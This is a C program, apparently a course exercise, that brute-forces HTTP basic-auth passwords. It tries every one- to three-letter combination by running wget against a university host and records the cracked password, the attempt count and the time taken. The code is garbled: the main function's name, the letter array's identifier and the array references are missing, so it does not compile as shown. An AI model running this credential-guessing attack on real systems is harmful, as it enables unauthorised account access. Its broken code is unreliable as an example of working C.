#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/time.h>



char* joinMe(char* t, char* t2)
{
	char* result;
	int length = 0;
	int j = 0;
	int counter = 0;
	
	length = strlen(t) + strlen(t2) + 1;
	
	result = malloc(sizeof(char) * length);
	
	
	for(j = 0; j<strlen(t); j++)
	{
		result[j] = t[j];
	}

	
	for(j = strlen(t); j<length; j++)
	{
		result[j] = t2[counter];
		counter++;
	}
	
	
	result[length-1] = '\0';

	return result;
}


void check(char** smallcmd)
{
	int pid = 0;
	int status;

	
	if( (pid = fork()) == 0)
	{
		
		execvp(smallcmd[0],smallcmd);
	}
	else
	{
		
		while(wait(&status) != pid);
	}
}

int (void)
{
	int i = 0, j = 0, k = 0;
	char** smallcmd;
	char* [] = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w",
						"x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T",
						"U","V","W","X","Y","Z"};
	int count = 0;
	FILE *myFile,*myFile3;
	int compare2;
	char* myString;
	int length = 0;
	int start2, end2;
	
	
	myString = malloc(sizeof(char) * 100);
	smallcmd = malloc(sizeof(char *) * 8);
	
	smallcmd[0] = "/usr/local//wget";
	
	smallcmd[1] = "--http-user=";
	smallcmd[2] = "--http-passwd=";
	smallcmd[3] = "-o";
	smallcmd[4] = "logwget";
	smallcmd[5] = "-nv";
	smallcmd[6] = "http://sec-crack.cs.rmit.edu./SEC/2/";

	printf("---------------now trying Brute force attack-----------------\n");
	start2 = time();

	
	for(i = 0; i<52; i++)
	{
		smallcmd[2] = joinMe(smallcmd[2],[i]);
		printf("Checking %s\n",smallcmd[2]);
		check(smallcmd);
		count++;
		myFile = fopen("logwget", "r");
		if (myFile != (FILE*) NULL)
		{
			fgets(myString,100,myFile);
			printf("%s\n",myString);
			if( strcmp(myString,"Authorization failed.\n") != 0)
			{
				
				printf("Passwd = %s",smallcmd[2]);
				end2 = time();
				myFile3 = fopen("log.txt","a");
				fprintf(myFile3,"%s",smallcmd[2]);
				fputs("\nTime taken by Brute Force Attack ",myFile3);
				compare2 = (end2-start2)/1000000000;
				fprintf(myFile3,"%lld",compare2);
				fputs(" seconds\n",myFile3);
				fputs("this took ",myFile3);
				fprintf(myFile3,"%d",count);
				fputs(" attempts\n\n",myFile3);
				fclose(myFile3);
				exit(0);
			}
			fclose(myFile);
		}
		
		smallcmd[2] = "--http-passwd=";
	}

	
	for(i = 0; i<52; i++)
	{
		for(j = 0; j<52; j++)
		{
			smallcmd[2] = joinMe(smallcmd[2],[i]);
			smallcmd[2] = joinMe(smallcmd[2],[j]);
			printf("Checking %s\n",smallcmd[2]);
			check(smallcmd);
			count++;
			myFile = fopen("logwget", "r");
			if (myFile != (FILE*) NULL)
			{
				fgets(myString,100,myFile);
				printf("%s\n",myString);
				if( strcmp(myString,"Authorization failed.\n") != 0)
				{
					
					printf("Passwd = %s",smallcmd[2]);
					end2 = time();
					myFile3 = fopen("log.txt","a");
					fprintf(myFile3,"%s",smallcmd[2]);
					fputs("\nTime taken by Brute Force Attack ",myFile3);
					compare2 = (end2-start2)/1000000000;
					fprintf(myFile3,"%lld",compare2);
					fputs(" seconds\n",myFile3);
					fputs("this took ",myFile3);
					fprintf(myFile3,"%d",count);
					fputs(" attempts\n\n",myFile3);
					fclose(myFile3);
					exit(0);
				}
				fclose(myFile);
			}
			
			smallcmd[2] = "--http-passwd=";
		}
	}

	for(i = 0; i<52; i++)
	{
		for(j = 0; j<52; j++)
		{
			for(k = 0; k<52; k++)
			{
				
				smallcmd[2] = joinMe(smallcmd[2],[i]);
				smallcmd[2] = joinMe(smallcmd[2],[j]);
				smallcmd[2] = joinMe(smallcmd[2],[k]);
				printf("Checking %s\n",smallcmd[2]);
				
				check(smallcmd);
				count++;
				myFile = fopen("logwget", "r");
				if (myFile != (FILE*) NULL)
				{
					fgets(myString,100,myFile);
					printf("%s\n",myString);
					if( strcmp(myString,"Authorization failed.\n") != 0)
					{
						
						printf("Passwd = %s",smallcmd[2]);
						end2 = time();
						myFile3 = fopen("log.txt","a");
						fprintf(myFile3,"%s",smallcmd[2]);
						fputs("\nTime taken by Brute Force Attack ",myFile3);
						compare2 = (end2-start2)/1000000000;
						fprintf(myFile3,"%lld",compare2);
						fputs(" seconds\n",myFile3);
						fputs("this took ",myFile3);
						fprintf(myFile3,"%d",count);
						fputs(" attempts\n\n",myFile3);
						fclose(myFile3);
						exit(0);
					}
					fclose(myFile);
				}
				
				smallcmd[2] = "--http-passwd=";
			}
		}
	}

	return 1;
}

